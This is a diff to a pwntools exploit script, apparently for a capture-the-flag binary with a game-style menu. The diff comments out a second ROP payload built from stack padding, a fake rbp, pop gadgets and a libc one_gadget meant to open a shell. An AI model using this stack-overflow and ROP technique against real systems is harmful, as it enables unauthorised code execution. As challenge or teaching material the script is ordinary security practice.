@@ -65,7 +65,7 @@ p.sendline(b"1")
 p.recvuntil(b"Enter world name:")
 
 # 1. Build and send first payload -----------------------------------------------
-# Structure: | padding | rbp | nop | read_int | puts | main | 
+# Structure: | padding | rbp | nop | read_int | puts |
 print("Building payload 1...")
 payload = b""
 
@@ -203,68 +203,68 @@ p.sendline(b"2")
 
 print("Opening shell...")
 p.interactive()
-exit(0)
 
 
 
-# Build second payload
-# 1. (first written, bottom of stack) Padding (64 bytes)
-padding = b'A' * 64
-# 2. Rbp (need to think about how it is affected by leave, so bss (0x404e00))
-rbp = p64(0x404e00)
-# 2.5 nop to 16 byte align stack
-#nop_gadget = p64(0x4010ef)
-# 3. one gadget
 
-pop_rbp_r13_gadget = p64(libc_base + pop_rbp_r13_offset)
+# # Build second payload
+# # 1. (first written, bottom of stack) Padding (64 bytes)
+# padding = b'A' * 64
+# # 2. Rbp (need to think about how it is affected by leave, so bss (0x404e00))
+# rbp = p64(0x404e00)
+# # 2.5 nop to 16 byte align stack
+# #nop_gadget = p64(0x4010ef)
+# # 3. one gadget
 
-pop_rbp_value = p64(0x404e00+0x100) # Just needs to be witeable
-pop_r13_value = p64(0) # NULL 
+# pop_rbp_r13_gadget = p64(libc_base + pop_rbp_r13_offset)
 
-pop_rdi_gadget = p64(libc_base + pop_rdi_offset)
-pop_rdi_value = p64(0) # NULL
+# pop_rbp_value = p64(0x404e00+0x100) # Just needs to be witeable
+# pop_r13_value = p64(0) # NULL 
 
-one_gadget = p64(libc_base + one_gadget_offset)
+# pop_rdi_gadget = p64(libc_base + pop_rdi_offset)
+# pop_rdi_value = p64(0) # NULL
 
-payload = padding + rbp + pop_rbp_r13_gadget + pop_rbp_value + \
-    pop_r13_value + pop_rdi_gadget + pop_rdi_value + one_gadget
-print("Payload length: ", len(payload))
+# one_gadget = p64(libc_base + one_gadget_offset)
 
-# Search payload for newline, break if found
-if b'\n' in payload:
-    print("Payload contains newline at index: ", payload.index(b'\n'))
-    print("Payload: ", payload)
-    input("Press enter to try anyways...")
-    # exit(1)
+# payload = padding + rbp + pop_rbp_r13_gadget + pop_rbp_value + \
+#     pop_r13_value + pop_rdi_gadget + pop_rdi_value + one_gadget
+# print("Payload length: ", len(payload))
+
+# # Search payload for newline, break if found
+# if b'\n' in payload:
+#     print("Payload contains newline at index: ", payload.index(b'\n'))
+#     print("Payload: ", payload)
+#     input("Press enter to try anyways...")
+#     # exit(1)
 
 
-# Get to second payload 
+# # Get to second payload 
 
-# ## Send 1 to select multiplayer
-# p.recvuntil(b"2. Multiplayer")
+# # ## Send 1 to select multiplayer
+# # p.recvuntil(b"2. Multiplayer")
+# # p.sendline(b"1")
+
+# # ## Receive "Enter World Name:"
+# # p.recvuntil(b"Enter world name:")
+
+# # Send second payload
+# p.sendline(payload)
+
+# # Navigate to return
+# p.recvuntil(b"2. Creative")
 # p.sendline(b"1")
 
-# ## Receive "Enter World Name:"
-# p.recvuntil(b"Enter world name:")
+# p.recvuntil(b"2. Exit")
+# p.sendline(b"2")
 
-# Send second payload
-p.sendline(payload)
-
-# Navigate to return
-p.recvuntil(b"2. Creative")
-p.sendline(b"1")
-
-p.recvuntil(b"2. Exit")
-p.sendline(b"2")
-
-p.interactive()
+# p.interactive()
 
 
-# # Receive forever
-# print("Receiving everything else...")
-# while True:
-#     try:
-#         output = p.recv()
-#         print(output)
-#     except EOFError:
-#         break
+# # # Receive forever
+# # print("Receiving everything else...")
+# # while True:
+# #     try:
+# #         output = p.recv()
+# #         print(output)
+# #     except EOFError:
+# #         break
